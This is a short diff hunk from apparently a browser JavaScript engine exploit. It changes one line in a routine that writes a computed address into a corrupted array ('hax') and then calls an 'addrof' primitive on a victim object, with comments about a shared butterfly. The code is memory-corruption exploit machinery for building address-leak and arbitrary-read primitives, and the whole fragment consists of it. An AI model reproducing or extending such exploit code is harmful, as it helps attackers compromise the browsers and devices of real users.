@@ -563,7 +563,7 @@ for (var i = 0; i < 1000; ++i) {
                 offset *= 8
                 return this.readInt64(where+offset);
             }
-            hax[1] = qwordAsFloat(where + 0x10);
+            hax[1] = (Add(where , 0x10)).asDouble();
             var res = this.addrof(victim1.prop);
             //hax[1] = reset;
             //victim1.prop = shared_butterfly;
